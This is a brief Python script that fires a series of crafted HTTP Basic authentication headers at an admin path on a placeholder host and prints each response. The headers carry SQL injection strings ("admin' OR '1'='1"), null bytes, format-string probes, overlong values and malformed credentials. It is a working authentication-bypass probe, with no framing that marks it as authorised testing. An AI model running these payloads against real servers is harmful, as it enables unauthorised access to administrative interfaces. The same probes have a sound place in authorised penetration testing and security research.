import urllib.request, urllib.error, base64
URL='https://<host>/unauth/admin/'
def test(tag, auth=None, extra=None):
    h={'User-Agent':'Mozilla/5.0'}
    if auth is not None: h['Authorization']=auth
    if extra: h.update(extra)
    r=urllib.request.Request(URL, headers=h)
    try:
        resp=urllib.request.urlopen(r, timeout=10); body=resp.read(); code=resp.status
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code
    except Exception as e:
        print('%-30s EXC %s'%(tag,e)); return
    print('%-30s %s %s %r'%(tag,code,len(body),body[:120]))
tests=[
 ('empty-auth','Basic '),
 ('garbage','Basic !!!!'),
 ('nocolon', 'Basic '+base64.b64encode(b'admin').decode()),
 ('nopass', 'Basic '+base64.b64encode(b'admin:').decode()),
 ('nouser', 'Basic '+base64.b64encode(b':pass').decode()),
 ('colononly','Basic '+base64.b64encode(b':').decode()),
 ('bearer','Bearer x'),
 ('nulls','Basic '+base64.b64encode(b'admin:\x00').decode()),
 ('sqli1','Basic '+base64.b64encode(b"admin' OR '1'='1:x").decode()),
 ('sqli2','Basic '+base64.b64encode(b"admin:x' OR '1'='1").decode()),
 ('sqli3','Basic '+base64.b64encode(b"' OR 1=1--:x").decode()),
 ('fmt','Basic '+base64.b64encode(b'{0.__class__}:x').decode()),
 ('long','Basic '+base64.b64encode(b'A'*500+b':B').decode()),
 ('utf8','Basic '+base64.b64encode('ñ:ñ'.encode()).decode()),
]
for t in tests: test(*t)
